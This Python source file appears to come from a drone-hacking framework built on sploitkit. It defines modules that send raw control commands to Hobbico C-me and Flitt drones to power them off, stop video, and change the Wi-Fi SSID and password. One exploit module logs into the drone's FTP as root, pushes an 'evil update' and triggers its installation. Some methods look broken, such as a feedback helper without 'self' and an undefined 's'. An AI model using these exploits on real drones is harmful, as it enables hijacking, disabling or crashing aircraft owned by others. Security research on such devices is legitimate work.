# -*- coding: UTF-8 -*-
import ast
import socket
import time
from datetime import datetime
from ftplib import FTP
from sploitkit import *


__all__ = ["CmeModule", "CmeUpdateModule", "FlittModule"]


class HobbicoModule(Module):
    """ Module proxy class for defining multiple common utility methods for
         Hobbico drones. """
    config = Config({
        Option(
            'TARGET',
            "Target's SSID",
            True,
        ): "Undefined",
    })
    
    def __feedback(success, failmsg):
        if success:
            self.logger.success(failmsg.replace("not ", ""))
        else:
            self.logger.failure(failmsg)
    
    def _change_ap_creds(self, ssid, pswd, new_ssid=True):
        self.logger.info("Changing %s..." % ["password", "SSID"][new_ssid])
        r = self.send_command(68, {"phrase": pswd, "ssid": ssid})
        self.__feedback(r, "AP password not changed")
    
    def _change_datetime(self, new_dt, dt_format):
        dt = datetime.strptime(new_dt, dt_format)
        self.logger.info("Changing datetime...")
        r = self.send_command(29, {"YEAR": dt.year, "MONTH": dt.month,
                                   "DAY": dt.day, "HOUR": dt.hour,
                                   "MINUTE": dt.minute, "SECOND": dt.second})
        self.__feedback(r, "Datetime not changed")
    
    def _get_sysinfo(self):
        self.logger.info("Requesting system information...")
        self.__feedback(self.send_command(0, -1), "System info not retrieved")
        return self.__last_cmd_resp
    
    def _power_off(self):
        self.logger.info("Shutting down the target...")
        self.__feedback(self.send_command(32, 0), "Target not powered off")

    def _stop_video(self):
        self.logger.info("Stopping video...")
        self.__feedback(self.send_command(47, 0), "Video not stopped")

    def preload(self):
        if self.console.state.get('TARGETS') is None or \
            len(self.console.state['TARGETS']) == 0:
            self.logger.warning("No target available yet ; please use module "
                                "'auxiliary/wifi/find_targets'")
            return False
        ip = self.config.option("IP").value
        if self.console._jobs.call("ping -c 1 -W 2 {}".format(ip)) != 0:
            self.logger.warning("Target seems to be down")
            return False
        return True
    
    def send_command(self, number, param):
        self.__last_cmd_resp = None
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.config.option("IP").value,
                   self.config.option("FLYCTL_PORT").value))
        payload = b'{"CMD" : %d, "PARAM" : %s}' % (number, str(param).encode())
        self.logger.debug("Send: " + payload.decode())
        success = False
        try:
            s.send(payload)
            r = ast.literal_eval(s.recv(1024).strip(b" \x00").decode())
            success = r['RESULT'] == 0
            self.logger.debug("Recv: {}".format(r))
            if not success:
                self.logger.failure("Command failed")
            self.__last_cmd_resp = r
        except Exception as e:
            self.logger.failure("Command failed ({})".format(e))
        s.close()
        return success


class CmeModule(HobbicoModule):
    """
    Module proxy class holding the default parameter of a C-me.
    
    Author:  Yannick Pasquazzo
    Email:   y.pasquazzo@hotmail.com
    Version: 1.0
    """
    config = Config({
        Option(
            'IP',
            "IP address of drone's AP",
            True,
        ): "192.168.100.1",
        Option(
            'FLYCTL_PORT',
            "Fly controller port",
            True,
        ): 4646,
    })
    path = "command/hobbico/cme"


class CmeUpdateModule(CmeModule):
    config = Config({
        Option(
            'FTP_PORT',
            "FTP service port",
            True,
        ): 2121,
    })
    path = "exploit/hobbico/cme"

    def send_update(self, filename=None):
        self.logger.info("Starting an FTP session...")
        ftp = FTP(self.config.get("IP"), self.config.get("FTP_PORT"))
        self.logger.debug("Authenticating...")
        ftp.sendcmd("USER root")
        ftp.sendcmd("PASS *")
        ftp.sendcmd("SYST")
        ftp.sendcmd("PWD")
        ftp.sendcmd("TYPE I")
        ftp.sendcmd("CWD /")
        ftp.sendcmd("PASV")
        self.logger.info("Pushing an evil update...")
        with open(self.config.get("UPDATE_FILE"), 'rb') as f:
            ftp.storbinary("STOR 0.7.15.zip", f)
        ftp.quit()
        self.logger.info("Triggering update...")
        success = s.send_command(71, '"0.7.15"')
        if success:
            delay = 10
            self.logger.info("Waiting {} seconds...".format(delay))
            time.sleep(delay)
            self.logger.success("Target updated")
            self.logger.info("Please restart the drone")
        return success


class FlittModule(HobbicoModule):
    """
    Module proxy class holding the default parameter of a Flitt.
    
    Author:  Yannick Pasquazzo
    Email:   y.pasquazzo@hotmail.com
    Version: 1.0
    """
    config = Config({
        Option(
            'IP',
            "IP address of drone's AP",
            True,
        ): "192.168.234.1",
        Option(
            'FLYCTL_PORT',
            "Fly controller port",
            True,
        ): 554,
    })
    path = "command/hobbico/flitt"
